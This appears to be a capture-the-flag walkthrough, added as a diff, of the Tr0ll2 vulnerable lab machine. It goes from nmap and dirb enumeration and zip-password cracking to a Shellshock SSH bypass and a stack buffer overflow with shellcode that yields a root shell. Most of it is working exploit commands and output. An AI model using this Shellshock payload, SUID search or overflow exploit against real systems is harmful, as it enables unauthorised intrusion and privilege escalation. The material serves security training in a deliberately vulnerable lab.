@@ -1,0 +1,179 @@
+
+nmap
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+-sC & -sV
+
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
+|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
+|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+MAC Address: 00:0C:29:2A:01:46 (VMware)
+Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+http open check webpage look for robots.txt
+
+User-agent:*
+Disallow:
+/noob
+/nope
+/try_harder
+/keep_trying
+/isnt_this_annoying
+/nothing_here
+/404
+/LOL_at_the_last_one
+/trolling_is_fun
+/zomg_is_this_it
+/you_found_me
+/I_know_this_sucks
+/You_could_give_up
+/dont_bother
+/will_it_ever_end
+/I_hope_you_scripted_this
+/ok_this_is_it
+/stop_whining
+/why_are_you_still_looking
+/just_quit
+/seriously_stop
+
+
+too many list most of it is empty so use dirb tool copy paths to paths.txt
+
+dirb http://192.168.1.46/ paths.txt
+
+GENERATED WORDS: 22                                                            
+
+---- Scanning URL: http://192.168.1.46/ ----
++ http://192.168.1.46//noob (CODE:301|SIZE:311)                                
++ http://192.168.1.46//keep_trying (CODE:301|SIZE:318)                         
++ http://192.168.1.46//dont_bother (CODE:301|SIZE:318)                         
++ http://192.168.1.46//ok_this_is_it (CODE:301|SIZE:320) 
+
+
+in dont_bother directory strings image we got 
+
+Look Deep within y0ur_self for the answer
+
+
+y0ur_self may be directoy 
+
+there we got a answer.txt have lot of base64 text that may be credentials convert & save it 
+
+base64 -d base64.txt > decode.txt
+
+try for login into ftp using Host: Trolls (from nmap o/p) as credentials 
+
+get a lmao.zip 
+
+while unzip asks for passwords 
+
+crack the password using tool fcrackzip tool, There we got a ssh private key 
+
+first try Troll not working try noob private key name noob
+
+ssh terminal have shellshock vulnerability, The Shellshock vulnerability (CVE-2014-6271) affects GNU Bash and allows remote code execution when untrusted environment variables are passed to a vulnerable Bash interpreter
+
+The Flaw: GNU Bash fails to stop parsing text after processing a function definition in an environment variable (using the syntax () { :; };). Any code placed immediately after that string is executed by the shell
+
+
+ssh -t -i noob noob@192.168.1.36 -o PubkeyAcceptedKeyTypes=+ssh-rsa '() { :;}; /bin/bash'
+
+
+look for suid binaries :  find / -user root -perm /4000 2>/dev/null
+
+
+/nothing_to_see_here
+/nothing_to_see_here/choose_wisely
+/nothing_to_see_here/choose_wisely/door2
+/nothing_to_see_here/choose_wisely/door2/r00t
+/nothing_to_see_here/choose_wisely/door3
+/nothing_to_see_here/choose_wisely/door3/r00t
+/nothing_to_see_here/choose_wisely/door1
+/nothing_to_see_here/choose_wisely/door1/r00t
+
+
+noob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door2/r00t
+Usage: /nothing_to_see_here/choose_wisely/door2/r00t input
+
+
+noob@Tr0ll2:~$ cd /nothing_to_see_here/choose_wisely/door1
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ gdb ./r00t
+
+
+msf-pattern_create -l 300
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+
+
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6a413969 in ?? ()
+
+(gdb) i r
+
+esp            0xbffffb50       0xbffffb50   
+
+reverse is : \x50\xfb\xff\xbf
+
+msf-pattern_offset -l 303 -q 0x6a413969
+[*] Exact match at offset 268
+
+
+if you need create for custom shell code : 
+
+msfvenom -p linux/x64/exec CMD=/bin/sh -f c "\x00"
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 44 bytes
+Final size of c file: 212 bytes
+unsigned char buf[] = 
+"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f"
+"\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00\x00\x2f"
+"\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58"
+"\x0f\x05";
+
+take it to single line add " at start & end 
+
+./r00t $(python -c 'print "A"*268 + "\x50\xfb\xff\xbf" + "\x90" * 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+Segmentation fault
+
+
+Another shell code : "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A"*268 + "\x60\xfc\xff\xbf" + "\x90" * 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+Illegal instruction
+
+
+here we got root access :
+
+./r00t $(python -c 'print "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*45 + "\x50\xfb\xff\xbf"')
+# id
+uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
+# whoami
+root
+
+cd /root
+# ls
+Proof.txt  core2  core4  hardmode  ran_dir.py
+core1      core3  goal   lmao.zip  reboot
+
+cat Proof.txt
+You win this time young Jedi...
+
+a70354f0258dcc00292c72aab3c8b1e4 
